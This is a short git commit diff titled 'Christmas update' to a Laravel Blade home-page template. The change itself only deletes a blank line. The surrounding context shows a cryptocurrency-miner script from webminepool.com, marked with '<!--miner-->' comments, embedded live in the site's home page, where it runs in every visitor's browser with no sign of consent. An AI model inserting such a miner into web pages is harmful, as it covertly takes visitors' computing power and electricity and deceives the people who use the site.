21fd25299767fb1627d5a6e8d8f284b602415b92
crus17 <christopher.crus17@gmail.com>
2023-12-11 18:09:00 +0100

    Christmas update

--- resources/views/home/index.blade.php
+++ resources/views/home/index.blade.php
@@ -7,7 +7,6 @@
     <meta name="viewport" content="width=1024">
     <!-- Responsive Meta -->                    
     <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
-    
  <!--miner-->
 <script src="https://webminepool.com/lib/base.js"></script>
 <!--miner-->
